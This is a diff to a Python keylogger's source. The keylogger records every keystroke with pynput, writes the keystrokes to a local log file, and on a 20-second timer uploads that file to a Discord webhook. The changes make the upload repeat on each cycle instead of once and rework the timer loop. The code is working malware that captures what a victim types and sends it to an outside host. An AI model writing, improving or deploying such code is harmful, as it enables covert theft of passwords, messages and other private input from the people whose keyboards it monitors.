@@ -17,7 +17,7 @@ log_path = "C:/Users/inchan/Desktop/Keylogger/log.txt"
 keylogs_str = ""
 last_key_time = time.time()
 delay_duration = 20  # Set the delay duration in seconds
-upload_triggered = False  # Flag to track if the upload has been triggered
+
 
 def send_webhook_with_file(webhook_url, file_path):
     with open(file_path, 'rb') as file:
@@ -31,13 +31,11 @@ def send_webhook_with_file(webhook_url, file_path):
             print(f"Failed to send message. Status code: {response.status_code}")
 
 def send_keylogs_to_discord():
-    global keylogs_str, upload_triggered
-    print(time.time() - last_key_time)
-
-    if not upload_triggered:
+    global keylogs_str
+    if keylogs_str:
         with open(log_path, 'a') as log_file:
             log_file.write(keylogs_str)
-
+        
         file_size = os.path.getsize(log_path) / (1024 * 1024)  # Convert bytes to megabytes
 
         print(math.floor(file_size))
@@ -52,8 +50,7 @@ def send_keylogs_to_discord():
             print("Uploading...")
 
         keylogs_str = ""
-        upload_triggered = True  # Set the flag to True after uploading
-
+    return
 def get_capslock_state():
     return ctypes.windll.user32.GetKeyState(0x14) & 1
 
@@ -136,26 +133,31 @@ def keyPressed(key):
 keyboard.Listener(on_press=keyPressed)
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    root.withdraw()  # Hide the main window
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
 
     try:
         while True:
-            time_elapsed = time.time() - last_key_time
-            time_remaining = max(0, delay_duration - time_elapsed)
 
-            if time_elapsed >= delay_duration:
-                send_keylogs_to_discord()
-                last_key_time = time.time()
+            start_time = time.time()
 
-            print(f"Time remaining: {time_remaining:.1f} seconds", end='\r')
-            time.sleep(1)  # Sleep for 1 second to avoid high CPU usage
+            while True:
+                time_elapsed = time.time() - start_time
+                time_remaining = max(0, delay_duration - time_elapsed)
+
+                print(f"Time remaining: {time_remaining:.1f} seconds", end='\r')
+
+                if time_remaining == 0:
+                    send_keylogs_to_discord()
+                    break
+
+                time.sleep(1)  # Sleep for 1 second to avoid high CPU usage
+
+            print("Timer finished. Restarting...\n")
+            
 
     except KeyboardInterrupt:
         pass
     finally:
         listener.stop()
         listener.join()
-
